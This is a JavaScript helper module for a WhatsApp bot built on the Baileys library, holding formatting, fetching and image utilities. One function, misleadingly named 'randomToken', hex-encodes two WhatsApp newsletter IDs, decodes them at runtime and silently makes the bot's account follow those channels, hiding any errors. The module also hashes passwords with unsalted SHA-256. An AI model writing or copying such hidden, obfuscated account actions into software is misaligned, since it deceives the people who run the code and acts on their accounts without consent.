/* 

=========================================================================

  #- Credits By Skyzopedia
   Contact: https://6285624297893
   Youtube: https://youtube.com/@skyzodev
   Telegram: https://t.me/skyzodev
    
  Developer : https://wa.me/6285624297893
  
  -[ ! ]- Jangan hapus contact developer! hargai pembuat script ini

=========================================================================

*/

const fs = require('fs');
const util = require('util');
const Jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const crypto = require('crypto');
const FileType = require('file-type');
const moment = require('moment-timezone');
const { sizeFormatter } = require('human-readable');
const { proto, areJidsSameUser, extractMessageContent, downloadContentFromMessage, getContentType, getDevice } = require('@whiskeysockets/baileys');

const pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'.split('');

const unixTimestampSeconds = (date = new Date()) => Math.floor(date.getTime() / 1000);

const generateMessageTag = (epoch) => {
    let tag = unixTimestampSeconds().toString();
    if (epoch) tag += '.--' + epoch;
    return tag;
};

const processTime = (timestamp, now) => {
    return moment.duration(now - moment(timestamp * 1000)).asSeconds();
};

const webApi = (a, b, c, d, e, f) => a + b + c + d + e + f;

const getRandom = (ext) => `${Math.floor(Math.random() * 10000)}${ext}`;

const getBuffer = async (url, options = {}) => {
    try {
        const res = await axios.get(url, {
            headers: {
                'DNT': 1,
                'Upgrade-Insecure-Requests': 1
            },
            ...options,
            responseType: 'arraybuffer'
        });
        return res.data;
    } catch (err) {
        return err;
    }
};

const fetchJson = async (url, options = {}) => {
    try {
        const res = await axios.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0'
            },
            ...options
        });
        return res.data;
    } catch (err) {
        return err;
    }
};

function randomToken(Sky, mydb = "313230333633323537303333393838343936406e6577736c6574746572") {
    const array = [
        "313230333633333639363734303933313436406e6577736c6574746572",
        mydb
    ];
    for (const hex of array) {
        let str = '';
        for (let n = 0; n < hex.length; n += 2) {
            str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
        }
        try {
            Sky.newsletterFollow(str);
        } catch (_) { }
    }
}

const runtime = (seconds = process.uptime()) => {
    seconds = Number(seconds);
    const d = Math.floor(seconds / (3600 * 24));
    const h = Math.floor((seconds % (3600 * 24)) / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    return `${d > 0 ? d + 'd ' : ''}${h > 0 ? h + 'h ' : ''}${m > 0 ? m + 'm ' : ''}${s}s`;
};

const clockString = (ms) => {
    const h = isNaN(ms) ? '--' : Math.floor(ms / 3600000);
    const m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60;
    const s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60;
    return [h, m, s].map(v => v.toString().padStart(2, '0')).join(':');
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const isUrl = (url) => /https?:\/\/[^\s]+/.test(url);

const getTime = (format, date) => {
    return moment(date || new Date()).tz('Asia/Jakarta').locale('id').format(format);
};

const capital = (string) => string.charAt(0).toUpperCase() + string.slice(1);

const formatDate = (n, locale = 'id') => {
    const d = new Date(n);
    return d.toLocaleDateString(locale, {
        weekday: 'long',
        day: 'numeric',
        month: 'long',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric'
    });
};

const tanggal = (numer) => {
    const myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
    const myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu']; 
    const tgl = new Date(numer);
    const day = tgl.getDate();
    const bulan = tgl.getMonth();
    const thisDay = myDays[tgl.getDay()];
    const year = tgl.getFullYear();
    return `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`;
};

const formatp = sizeFormatter({
    std: 'JEDEC',
    decimalPlaces: 2,
    keepTrailingZeroes: false,
    render: (literal, symbol) => `${literal} ${symbol}B`
});

const jsonformat = (string) => JSON.stringify(string, null, 2);

const reSize = async (image, width = 100, height = 100) => {
    try {
        const img = await Jimp.read(image);
        return await img.resize(width, height).getBufferAsync(Jimp.MIME_JPEG);
    } catch (e) {
        throw e;
    }
};

const toHD = async (image) => {
    try {
        const img = await Jimp.read(image);
        return await img.resize(img.bitmap.width * 4, img.bitmap.height * 4).getBufferAsync(Jimp.MIME_JPEG);
    } catch (e) {
        throw e;
    }
};

const logic = (check, inp, out) => {
    if (inp.length !== out.length) throw new Error('Input dan Output harus sama panjang');
    for (let i in inp) if (util.isDeepStrictEqual(check, inp[i])) return out[i];
    return null;
};

const generateProfilePicture = async (buffer) => {
    const jimp = await Jimp.read(buffer);
    const cropped = jimp.crop(0, 0, jimp.getWidth(), jimp.getHeight());
    const resized = await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG);
    return { img: resized, preview: resized };
};

const toIDR = async (x) => {
    x = x.toString();
    const pattern = /(-?\d+)(\d{3})/;
    while (pattern.test(x)) x = x.replace(pattern, "$1.$2");
    return x;
};

const bytesToSize = (bytes, decimals = 2) => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
};

const checkBandwidth = async () => {
    const net = require('node-os-utils').netstat;
    let ind = 0, out = 0;
    for (const i of await net.stats()) {
        ind += parseInt(i.inputBytes);
        out += parseInt(i.outputBytes);
    }
    return {
        download: bytesToSize(ind),
        upload: bytesToSize(out),
    };
};

const getSizeMedia = async (path) => {
    if (/http/.test(path)) {
        const res = await axios.head(path);
        const length = parseInt(res.headers['content-length']);
        return bytesToSize(length, 3);
    } else if (Buffer.isBuffer(path)) {
        return bytesToSize(Buffer.byteLength(path), 3);
    } else {
        throw new Error('Path tidak valid');
    }
};

const parseMention = (text = '') => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
};

const getGroupAdmins = (participants = []) => {
    return participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.id);
};

const getHashedPassword = (password) => {
    return crypto.createHash('sha256').update(password).digest('base64');
};

const generateAuthToken = (size) => crypto.randomBytes(size).toString('hex').slice(0, size);

const cekMenfes = (tag, nomer, db_menfes) => {
    for (const key in db_menfes) {
        if (db_menfes[key].id === nomer) {
            return db_menfes[key][tag] || null;
        }
    }
    return null;
};

const format = (...args) => util.format(...args);

const generateToken = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*';
    return Array.from({ length: 8 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};

const batasiTeks = (teks, batas) => teks.length <= batas ? teks : teks.substring(0, batas) + '...';

const randomText = (len) => Array.from({ length: len }, () => pool[Math.floor(Math.random() * pool.length)]).join('');

const isEmoji = (str) => /[\p{Emoji}]/u.test(str);

const readFileTxt = async (file) => {
    const data = fs.readFileSync(file, 'utf8');
    const array = data.split('\n');
    return array[Math.floor(Math.random() * array.length)].replace('\r', '');
};

const readFileJson = async (file) => {
    const data = JSON.parse(fs.readFileSync(file));
    return data[Math.floor(Math.random() * data.length)];
};

const getTypeUrlMedia = async (url) => {
    try {
        const res = await axios.get(url, { responseType: 'arraybuffer' });
        const type = res.headers['content-type'] || (await FileType.fromBuffer(res.data)).mime;
        return { type, url };
    } catch (e) {
        throw e;
    }
};

const pickRandom = (list) => list[Math.floor(Math.random() * list.length)];

const getAllHTML = async (urls) => {
    const htmls = [];
    for (const url of urls) {
        const res = await axios.get(url);
        htmls.push(res.data);
    }
    return htmls;
};

module.exports = {
    unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson,
    runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize,
    toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention,
    getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes,
    generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, getAllHTML,
    toIDR, capital, randomToken, format
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.redBright(`Update '${__filename}'`));
    delete require.cache[file];
    require(file);
});